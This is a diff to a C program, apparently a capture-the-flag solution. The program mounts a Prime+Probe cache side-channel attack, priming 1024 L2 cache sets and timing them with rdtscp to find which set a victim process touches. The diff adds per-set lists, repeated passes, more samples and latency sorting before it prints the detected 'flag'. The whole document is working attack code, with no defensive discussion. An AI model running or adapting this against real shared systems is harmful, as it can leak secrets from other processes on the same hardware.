@@ -26,7 +26,7 @@ struct node {
 };
 
 void *buf;
-struct node *current_set_head;
+struct node *sets[1024]; // Pointers to the start of each set's list
 
 // Shuffle an array of pointers
 void shuffle(struct node **array, int n) {
@@ -54,26 +54,41 @@ void build_set(int set_index) {
     }
     nodes[L2_WAYS-1]->next = NULL;
     
-    current_set_head = nodes[0];
+    sets[set_index] = nodes[0];
 }
 
 // Prime the current set
-void prime_set() {
-    struct node *curr = current_set_head;
+void prime_set(int set_index) {
+    struct node *curr = sets[set_index];
     while (curr) {
         curr = curr->next;
     }
 }
 
 // Probe the current set and return the access time
-uint64_t probe_set() {
+uint64_t probe_set(int set_index) {
     uint64_t start = rdtscp();
-    struct node *curr = current_set_head;
+    struct node *curr = sets[set_index];
     while (curr) {
         curr = curr->next;
     }
     uint64_t end = rdtscp();
     return end - start;
+}
+
+// Structure to store results for sorting
+typedef struct {
+    int set_index;
+    uint64_t avg_latency;
+} Result;
+
+int compare_results(const void *a, const void *b) {
+    Result *r1 = (Result *)a;
+    Result *r2 = (Result *)b;
+    // Sort descending by latency
+    if (r2->avg_latency > r1->avg_latency) return 1;
+    if (r2->avg_latency < r1->avg_latency) return -1;
+    return 0;
 }
 
 int main(int argc, char const *argv[]) {
@@ -89,42 +104,55 @@ int main(int argc, char const *argv[]) {
     
     *((char *)buf) = 1; // dummy write
 
-    int flag = -1;
-    uint64_t max_latency = 0;
-    
-    // We can repeat the scan multiple times to be sure
-    // Or just scan once with enough samples.
-    // Let's do one pass first.
-    
-    // printf("Scanning L2 sets...\n");
-
+    printf("Building sets...\n");
     for (int i = 0; i < 1024; i++) {
         build_set(i);
-        
-        uint64_t total_latency = 0;
-        int samples = 200; // Increase samples for better signal-to-noise
-        
-        for (int k = 0; k < samples; k++) {
-            prime_set();
-            // Wait a bit for victim to access
-            // Victim loop is tight, so short wait is fine.
-            for(volatile int w=0; w<500; w++);
-            total_latency += probe_set();
-        }
-        
-        uint64_t avg_latency = total_latency / samples;
-        
-        // Debug print
-        // if (avg_latency > 300) {
-        //     printf("Set %d: %llu\n", i, (unsigned long long)avg_latency);
-        // }
+    }
 
-        if (avg_latency > max_latency) {
-            max_latency = avg_latency;
-            flag = i;
+    printf("Scanning L2 sets (this may take a moment)...\n");
+
+    Result results[1024];
+    for (int i = 0; i < 1024; i++) {
+        results[i].set_index = i;
+        results[i].avg_latency = 0;
+    }
+
+    int passes = 3;
+    int samples = 500;
+
+    for (int p = 0; p < passes; p++) {
+        printf("Pass %d/%d...\n", p+1, passes);
+        for (int i = 0; i < 1024; i++) {
+            uint64_t total_latency = 0;
+            
+            for (int k = 0; k < samples; k++) {
+                prime_set(i);
+                // Wait a bit for victim to access
+                for(volatile int w=0; w<1000; w++);
+                total_latency += probe_set(i);
+            }
+            
+            results[i].avg_latency += (total_latency / samples);
         }
     }
 
-    printf("Flag: %d\n", flag);
+    // Average over passes
+    for (int i = 0; i < 1024; i++) {
+        results[i].avg_latency /= passes;
+    }
+
+    // Sort results
+    qsort(results, 1024, sizeof(Result), compare_results);
+
+    printf("\nTop 5 High Latency Sets:\n");
+    for (int i = 0; i < 5; i++) {
+        printf("Set %d: %llu cycles\n", results[i].set_index, (unsigned long long)results[i].avg_latency);
+    }
+
+    // Heuristic: If Set 0 is the highest but others are also high, 
+    // the flag might be the second highest if Set 0 is noisy.
+    // But we just print the top one as the detected flag for now.
+    printf("\nDetected Flag: %d\n", results[0].set_index);
+    
     return 0;
 }
